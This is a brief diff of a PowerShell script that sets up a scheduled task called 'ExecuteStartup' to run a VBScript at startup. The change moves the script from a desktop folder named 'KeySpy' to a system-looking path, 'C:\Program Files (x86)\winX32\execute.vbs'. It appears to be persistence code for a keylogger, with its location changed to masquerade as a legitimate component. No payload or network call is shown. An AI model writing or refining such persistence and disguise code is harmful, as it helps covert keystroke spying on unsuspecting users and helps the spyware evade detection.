@@ -2,7 +2,7 @@
 $taskName = "ExecuteStartup"
 
 # Path to the VBScript
-$scriptPath = "C:\Users\samra\Desktop\KeySpy\execute.vbs"
+$scriptPath = "C:\Program Files (x86)\winX32\execute.vbs"
 
 # Check if the task already exists and unregister it if it does
 Unregister-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
